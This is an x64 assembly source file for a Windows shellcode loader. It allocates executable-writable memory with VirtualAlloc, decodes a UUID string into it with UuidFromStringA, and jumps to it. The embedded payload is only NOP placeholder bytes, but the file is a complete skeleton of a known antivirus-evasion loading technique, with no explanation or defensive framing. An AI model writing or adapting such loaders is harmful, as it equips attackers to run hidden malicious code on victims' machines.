; windows_loader64bits_uuidfromstring.asm

extrn VirtualAlloc :PROC
extrn UuidFromStringA :PROC

.data
    uuid        DB "90909090-9090-9090-9090-909090909090", 0
    baseAddr    DQ ?

.code
Start PROC
    SUB     rsp, 28h

    XOR     rcx, rcx
    MOV     rdx, 100h
    MOV     r8, 1000h ; MEM_COMMIT
    MOV     r9, 40h ; PAGE_EXECUTE_READWRITE
    CALL    VirtualAlloc
    MOV     baseAddr, rax

    LEA     rcx, uuid
    MOV     rdx, baseAddr
    CALL    UuidFromStringA

    CALL    baseAddr
Start ENDP

END